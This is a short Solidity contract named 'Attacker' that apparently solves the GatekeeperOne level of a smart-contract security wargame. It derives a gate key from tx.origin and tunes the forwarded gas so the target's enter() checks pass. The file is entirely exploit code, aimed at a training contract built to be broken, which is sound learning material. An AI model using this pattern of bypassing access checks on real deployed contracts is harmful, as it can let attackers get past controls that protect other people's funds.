// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


interface GatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract Attacker {

    function attack(uint256 gas, address target) external {
        GatekeeperOne gate = GatekeeperOne(target);

        uint16 k16 = uint16(uint160(tx.origin));
        uint64 k64 = uint64(1 << 63) + uint64(k16);

        bytes8 key = bytes8(k64);
        require(gas < 8191,"gas > 8191");
        require(gate.enter{gas: 8191 * 10 + gas}(key),"Failed!");
    }

}

